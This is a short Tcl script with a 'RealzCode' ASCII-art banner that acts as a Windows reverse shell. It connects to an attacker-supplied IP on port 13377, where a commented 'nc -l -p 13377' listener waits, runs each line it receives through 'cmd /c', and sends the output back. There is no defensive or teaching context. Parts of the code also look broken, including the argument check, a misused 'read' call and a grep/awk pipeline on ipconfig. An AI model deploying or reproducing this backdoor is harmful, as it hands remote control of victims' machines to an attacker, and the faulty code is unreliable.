set asciiArt {
  _____            _      _____          _
 |  __ \          | |    / ____|        | |
 | |__) |___  __ _| |___| |     ___   __| | ___
 |  _  // _ \/ _` | |_  / |    / _ \ / _` |/ _ \
 | | \ \  __/ (_| | |/ /| |___| (_) | (_| |  __/
 |_|  \_\___|\__,_|_/___|\_____\___/ \__,_|\___|
}

set po 13377 # nc -l -p 13377

if {[llength $argv] < 2} {
    puts "Please provide the IP address as a command-line argument."
    exit 1
}

set ip [lindex $argv 0]

set clientIP [exec ipconfig | grep "IPv4 Address" | awk -F ": " {print $2}]

set sock [socket $ip $po]

if {[catch {puts $sock $asciiArt}] == 0} {
    while {[catch {read $sock line}] == 0} {
        puts "Received: $line"

        if {$line == "exit"} {
            close $sock
            exit
        } else {
            set output [exec {*}[auto_execok cmd] /c $line 2>@1]
            puts $sock $output
        }
    }
}
